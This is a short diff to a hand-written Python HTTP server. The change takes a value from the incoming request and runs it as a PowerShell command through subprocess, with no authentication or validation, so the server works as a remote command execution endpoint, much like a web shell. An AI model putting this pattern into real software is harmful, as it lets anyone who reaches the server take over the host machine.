@@ -1,5 +1,6 @@
 import socket
 import os
+import subprocess
 
 class TCPServer:
 
@@ -117,7 +118,8 @@ class HTTPServer(TCPServer):
         index = command.find("=");
         command = command[index+1:-1]
 
-        print(command)
+        #print(command)
+        rc = ExecuteCode(command)
 
         #call function here to actually execute the code
 
@@ -176,6 +178,11 @@ class HTTPRequest:
 
             # here is probably where you would parse the request body
 
+
+class ExecuteCode:
+    def __init__(self,command):
+        process = subprocess.run(["powershell", "-Command",command], capture_output=True,text=True)
+        print(process)
 
 if __name__ == '__main__':
     server = HTTPServer()
